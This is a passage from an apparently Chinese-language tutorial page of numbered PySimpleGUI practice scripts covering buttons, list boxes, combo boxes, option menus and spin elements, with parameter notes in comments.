class="literal">True</span>)]]</span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python练习窗&#x27;</span>,layout,keep_on_top=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,value=window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="14编写一个红绿灯（按键练习）-py"><a href="#14编写一个红绿灯（按键练习）-py" class="headerlink" title="14编写一个红绿灯（按键练习）.py"></a>14编写一个红绿灯（按键练习）.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">要求：</span></span><br><span class="line"><span class="string">1.窗口有三个按键，绿灯，黄灯，红灯</span></span><br><span class="line"><span class="string">2.利用元素更新的方法</span></span><br><span class="line"><span class="string">3.实现按下一个灯，另外两个灯熄灭（变灰色）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">[sg.B(<span class="string">&#x27;绿灯&#x27;</span>,key=<span class="string">&#x27;-green-&#x27;</span>,button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;green&#x27;</span>),size=(<span class="number">30</span>,<span class="number">9</span>))],</span><br><span class="line">[sg.B(<span class="string">&#x27;黄灯&#x27;</span>,key=<span class="string">&#x27;-yellow-&#x27;</span>,button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;yellow&#x27;</span>),size=(<span class="number">30</span>,<span class="number">9</span>))],</span><br><span class="line">[sg.B(<span class="string">&#x27;红灯&#x27;</span>,key=<span class="string">&#x27;-red-&#x27;</span>,button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;red&#x27;</span>),size=(<span class="number">30</span>,<span class="number">9</span>))],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;红绿灯&#x27;</span>,layout)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,value=window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;-green-&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-green-&#x27;</span>].update(button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;green&#x27;</span>))</span><br><span class="line">        window[<span class="string">&#x27;-yellow-&#x27;</span>].update(button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;grey&#x27;</span>))</span><br><span class="line">        window[<span class="string">&#x27;-red-&#x27;</span>].update(button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;grey&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;-yellow-&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-green-&#x27;</span>].update(button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;grey&#x27;</span>))</span><br><span class="line">        window[<span class="string">&#x27;-yellow-&#x27;</span>].update(button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;yellow&#x27;</span>))</span><br><span class="line">        window[<span class="string">&#x27;-red-&#x27;</span>].update(button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;grey&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;-red-&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-green-&#x27;</span>].update(button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;grey&#x27;</span>))</span><br><span class="line">        window[<span class="string">&#x27;-yellow-&#x27;</span>].update(button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;grey&#x27;</span>))</span><br><span class="line">        window[<span class="string">&#x27;-red-&#x27;</span>].update(button_color=(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;red&#x27;</span>))</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="15列表元素的设定方法-py"><a href="#15列表元素的设定方法-py" class="headerlink" title="15列表元素的设定方法.py"></a>15列表元素的设定方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">列表元素的书写方法</span></span><br><span class="line"><span class="string">list=[&#x27;python&#x27;,&#x27;java&#x27;,&#x27;c++&#x27;,&#x27;php&#x27;,&#x27;html&#x27;]</span></span><br><span class="line"><span class="string">sg.Listbox(list)</span></span><br><span class="line"><span class="string">sg.LB(list)</span></span><br><span class="line"><span class="string">按键元素的设定方法</span></span><br><span class="line"><span class="string">sg.LB(list,size=(None,None))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;c++&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;html&#x27;</span>]</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">[sg.LB(<span class="built_in">list</span>,</span><br><span class="line">default_values=<span class="string">&#x27;python&#x27;</span>, <span class="comment"># 默认选中的值或者列表</span></span><br><span class="line">key=<span class="string">&#x27;-LB-&#x27;</span>,   <span class="comment"># 元素的唯一标识符</span></span><br><span class="line">select_mode=<span class="string">&#x27;single&#x27;</span>,   <span class="comment"># 选择模式，有效值包含如下4种：1.single，单选，更换时点击选择；2.multiple，可以多选，逐一点击选择；</span></span><br><span class="line">                    <span class="comment"># 3.browse，单选，鼠标按住也可以更换选择；4.extend,可以多选，鼠标按住也可以扩展选择</span></span><br><span class="line">enable_events=<span class="literal">True</span>, <span class="comment">#  元素的事件属性，如果设定为True,元素列表项目被选中时会发生事件</span></span><br><span class="line">bind_return_key=<span class="literal">True</span>, <span class="comment">#   绑定回车键，如果设定为True，回车键被按下时相当于此元素被点击</span></span><br><span class="line">size=(<span class="number">30</span>,<span class="number">6</span>),   <span class="comment"># 字符宽度，行高</span></span><br><span class="line">disabled=<span class="literal">False</span>, <span class="comment"># 元素是否禁用</span></span><br><span class="line">auto_size_text=<span class="literal">None</span>,    <span class="comment">#   如果为True,元素自动根据内容大小调整</span></span><br><span class="line">font=<span class="literal">None</span>,  <span class="comment"># 设置字体名称或者大小</span></span><br><span class="line">no_scrollbar=<span class="literal">False</span>,     <span class="comment">#  如果为True，则没有滚动条</span></span><br><span class="line">background_color=<span class="literal">None</span>,  <span class="comment">#   背景颜色设定</span></span><br><span class="line">text_color=<span class="literal">None</span>,    <span class="comment">#   字体颜色设定</span></span><br><span class="line">pad=<span class="literal">None</span>,   <span class="comment"># 元素间隔设定</span></span><br><span class="line">tooltip=<span class="literal">None</span>,   <span class="comment"># 悬浮文本</span></span><br><span class="line">right_click_menu=<span class="literal">None</span>,  <span class="comment"># 右击调出菜单</span></span><br><span class="line">visible=<span class="literal">True</span>,   <span class="comment"># 元素可见状态设定</span></span><br><span class="line"></span><br><span class="line">)]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,value=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="16列表元素的更新方法-py"><a href="#16列表元素的更新方法-py" class="headerlink" title="16列表元素的更新方法.py"></a>16列表元素的更新方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">列表元素的更新方法</span></span><br><span class="line"><span class="string">window[key].update()</span></span><br><span class="line"><span class="string">window[key].Update()</span></span><br><span class="line"><span class="string">values=None, # 元组或者列表，举例：values=[1,3], values=(1,3)</span></span><br><span class="line"><span class="string">disabled=None, #    bool: 更新元素是否禁用</span></span><br><span class="line"><span class="string">set_to_index=None, # 高亮显示设定的索引，Union[init,list,tuple]，举例：set_to_index=1, set_to_index=[1,2],set_to_index=(1,2),</span></span><br><span class="line"><span class="string">                    # 注意：单击只是高亮显示，并未选中。双击才是高亮显示+选中。单击获取值时，不用values(key)，而是window[key].get()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">scroll_to_index=None,   # int：将设定的索引跳到要显示的第一行</span></span><br><span class="line"><span class="string">select_mode=None, # 选择模式，有效值包含如下4种：1.single，单选，更换时点击选择；2.multiple，可以多选，逐一点击选择；</span></span><br><span class="line"><span class="string">                    # 3.browse，单选，鼠标按住也可以更换选择；4.extend,可以多选，鼠标按住也可以扩展选择</span></span><br><span class="line"><span class="string">visible=True,   # 元素可见状态设定</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">list1=[<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;c++&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;html&#x27;</span>]</span><br><span class="line">list2=[<span class="string">&#x27;程序员无声&#x27;</span>,<span class="string">&#x27;程序员大胖&#x27;</span>,<span class="string">&#x27;程序员小肥&#x27;</span>,<span class="string">&#x27;程序员不瘦&#x27;</span>]</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">[sg.LB(list1,size=(<span class="number">30</span>,<span class="number">6</span>),key=<span class="string">&#x27;-list-&#x27;</span>)],</span><br><span class="line">[sg.B(<span class="string">&#x27;编程语言&#x27;</span>),sg.B(<span class="string">&#x27;程序员&#x27;</span>)],</span><br><span class="line">[sg.B(<span class="string">&#x27;set_to_index&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    key=<span class="string">&#x27;-list-&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;程序员&#x27;</span>:</span><br><span class="line">        window[key].update(values=list2)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;set_to_index&#x27;</span>:</span><br><span class="line">        window[key].update(set_to_index=<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(window[key].get())</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="17在窗口上调用字典里的键和值-py"><a href="#17在窗口上调用字典里的键和值-py" class="headerlink" title="17在窗口上调用字典里的键和值.py"></a>17在窗口上调用字典里的键和值.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">dict=&#123;&#x27;程序员无声&#x27;:&#x27;python&#x27;,&#x27;程序员大胖&#x27;:&#x27;java&#x27;,&#x27;程序员小肥&#x27;:&#x27;c++&#x27;,&#x27;程序员不瘦&#x27;:&#x27;php&#x27;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"><span class="built_in">dict</span>=&#123;<span class="string">&#x27;程序员无声&#x27;</span>:<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;程序员大胖&#x27;</span>:<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;程序员小肥&#x27;</span>:<span class="string">&#x27;c++&#x27;</span>,<span class="string">&#x27;程序员不瘦&#x27;</span>:<span class="string">&#x27;php&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">list</span>=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">    <span class="built_in">list</span>.append(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.LB(<span class="built_in">list</span>,key=<span class="string">&#x27;-LB-&#x27;</span>,size=(<span class="number">30</span>,<span class="number">6</span>),enable_events=<span class="literal">True</span>)],</span><br><span class="line">    [sg.T(<span class="string">&#x27;语言&#x27;</span>),sg.In(key=<span class="string">&#x27;-YY-&#x27;</span>,size=(<span class="number">25</span>))]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;-LB-&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-YY-&#x27;</span>].update(<span class="built_in">dict</span>[values[<span class="string">&#x27;-LB-&#x27;</span>][<span class="number">0</span>]])</span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="18下拉菜单的设定方法-py"><a href="#18下拉菜单的设定方法-py" class="headerlink" title="18下拉菜单的设定方法.py"></a>18下拉菜单的设定方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sg.Combo() or sg.InputCombo() or sg.DropDown() or sg.Drop()</span></span><br><span class="line"><span class="string">Combo和Listbox最大的区别在于，可以输入，但是不能多选。</span></span><br><span class="line"><span class="string">listbox取得的值是存放在列表里面，但是Combo取得的值是对象本身</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"><span class="built_in">list</span>=[<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;c++&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;html&#x27;</span>]</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">[sg.Drop(<span class="built_in">list</span>,</span><br><span class="line">default_value=<span class="string">&#x27;python&#x27;</span>, <span class="comment"># 默认选中的值或者列表</span></span><br><span class="line">key=<span class="literal">None</span>,   <span class="comment"># 元素的唯一标识符</span></span><br><span class="line">enable_events=<span class="literal">True</span>, <span class="comment">#  元素的事件属性，如果设定为True,元素列表项目被选中时会发生事件</span></span><br><span class="line">bind_return_key=<span class="literal">True</span>, <span class="comment">#   绑定回车键，如果设定为True，回车键被按下时相当于此元素被点击</span></span><br><span class="line">size=(<span class="number">30</span>,<span class="number">6</span>),   <span class="comment"># 字符宽度，行高</span></span><br><span class="line">disabled=<span class="literal">False</span>, <span class="comment"># 元素是否禁用</span></span><br><span class="line">auto_size_text=<span class="literal">None</span>,    <span class="comment">#   如果为True,元素自动根据内容大小调整</span></span><br><span class="line">font=<span class="literal">None</span>,  <span class="comment"># 设置字体名称或者大小</span></span><br><span class="line">background_color=<span class="literal">None</span>,  <span class="comment">#   背景颜色设定</span></span><br><span class="line">text_color=<span class="literal">None</span>,    <span class="comment">#   字体颜色设定</span></span><br><span class="line">pad=<span class="literal">None</span>,   <span class="comment"># 元素间隔设定</span></span><br><span class="line">tooltip=<span class="literal">None</span>,   <span class="comment"># 悬浮文本</span></span><br><span class="line">visible=<span class="literal">True</span>,   <span class="comment"># 元素可见状态设定</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="19下拉菜单的更新方法及小练习-py"><a href="#19下拉菜单的更新方法及小练习-py" class="headerlink" title="19下拉菜单的更新方法及小练习.py"></a>19下拉菜单的更新方法及小练习.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">window[key].update</span></span><br><span class="line"><span class="string">window[key].Update</span></span><br><span class="line"><span class="string">下拉菜单可更新的属性</span></span><br><span class="line"><span class="string">value=None, # 更新默认选中的选项</span></span><br><span class="line"><span class="string">values=None， #  更新显示的所有下拉菜单文本</span></span><br><span class="line"><span class="string">set_to_index=None, # 高亮显示设定的索引的文本</span></span><br><span class="line"><span class="string">disabled=None, # 更新元素的禁用状态</span></span><br><span class="line"><span class="string">readonly=None, # 更新元素是否可读</span></span><br><span class="line"><span class="string">font=None, #   更新元素的字体名称或者大小</span></span><br><span class="line"><span class="string">visible=None, # 定义元素为不可见</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"><span class="built_in">dict</span>=&#123;<span class="string">&#x27;程序员无声&#x27;</span>:<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;程序员大胖&#x27;</span>:<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;程序员小肥&#x27;</span>:<span class="string">&#x27;c++&#x27;</span>,<span class="string">&#x27;程序员不瘦&#x27;</span>:<span class="string">&#x27;php&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">list</span>=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">    <span class="built_in">list</span>.append(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.Combo(<span class="built_in">list</span>,key=<span class="string">&#x27;-LB-&#x27;</span>,size=(<span class="number">30</span>,<span class="number">6</span>),enable_events=<span class="literal">True</span>)],</span><br><span class="line">    [sg.T(<span class="string">&#x27;语言&#x27;</span>),sg.In(key=<span class="string">&#x27;-YY-&#x27;</span>,size=(<span class="number">25</span>))]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;-LB-&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-YY-&#x27;</span>].update(<span class="built_in">dict</span>[values[<span class="string">&#x27;-LB-&#x27;</span>]])</span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="20选择菜单和旋转按键-py"><a href="#20选择菜单和旋转按键-py" class="headerlink" title="20选择菜单和旋转按键.py"></a>20选择菜单和旋转按键.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">书写方法：sg.OptionMenu()</span></span><br><span class="line"><span class="string">此元素和设置了只读属性的ComboBox很像，它没有‘font’属性，不可以设定字体样式和大小</span></span><br><span class="line"><span class="string">没有‘enable_event’事件属性，不可以触发事件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">选择菜单可设定的属性</span></span><br><span class="line"><span class="string">default_values=&#x27;python&#x27;, # 默认选中的值或者列表</span></span><br><span class="line"><span class="string">key=&#x27;-LB-&#x27;,   # 元素的唯一标识符</span></span><br><span class="line"><span class="string">size=(30,6),   # 字符宽度，行高</span></span><br><span class="line"><span class="string">disabled=False, # 元素是否禁用</span></span><br><span class="line"><span class="string">auto_size_text=None,    #   如果为True,元素自动根据内容大小调整</span></span><br><span class="line"><span class="string">background_color=None,  #   背景颜色设定</span></span><br><span class="line"><span class="string">text_color=None,    #   字体颜色设定</span></span><br><span class="line"><span class="string">pad=None,   # 元素间隔设定</span></span><br><span class="line"><span class="string">tooltip=None,   # 悬浮文本</span></span><br><span class="line"><span class="string">visible=True,   # 元素可见状态设定</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">选择菜单可更新的属性</span></span><br><span class="line"><span class="string">value=None, # 更新默认选中的元素</span></span><br><span class="line"><span class="string">values=None, # 更新所有显示的文本选项</span></span><br><span class="line"><span class="string">disabled=None, # 更新元素的禁用状态</span></span><br><span class="line"><span class="string">visible=None, # 更新元素的可见状态</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">旋转按钮</span></span><br><span class="line"><span class="string">书写方法：sg.Spin()</span></span><br><span class="line"><span class="string">特征：含有向上向下两个箭头按钮</span></span><br><span class="line"><span class="string">可设定的属性</span></span><br><span class="line"><span class="string">initial_value=&#x27;python&#x27;, # 默认选中的值或者列表</span></span><br><span class="line"><span class="string">key=&#x27;-LB-&#x27;,   # 元素的唯一标识符</span></span><br><span class="line"><span class="string">enable_events=True, #  元素的事件属性，如果设定为True,元素列表项目被选中时会发生事件</span></span><br><span class="line"><span class="string">size=(30,6),   # 字符宽度，行高</span></span><br><span class="line"><span class="string">disabled=False, # 元素是否禁用</span></span><br><span class="line"><span class="string">auto_size_text=None,    #   如果为True,元素自动根据内容大小调整</span></span><br><span class="line"><span class="string">font=None,  # 设置字体名称或者大小</span></span><br><span class="line"><span class="string">background_color=None,  #   背景颜色设定</span></span><br><span class="line"><span class="string">text_color=None,    #   字体颜色设定</span></span><br><span class="line"><span class="string">pad=None,   # 元素间隔设定</span></span><br><span class="line"><span class="string">tooltip=None,   # 悬浮文本</span></span><br><span class="line"><span class="string">visible=True,   # 元素可见状态设定</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">可更新的属性</span></span><br><span class="line"><span class="string">value=None, # 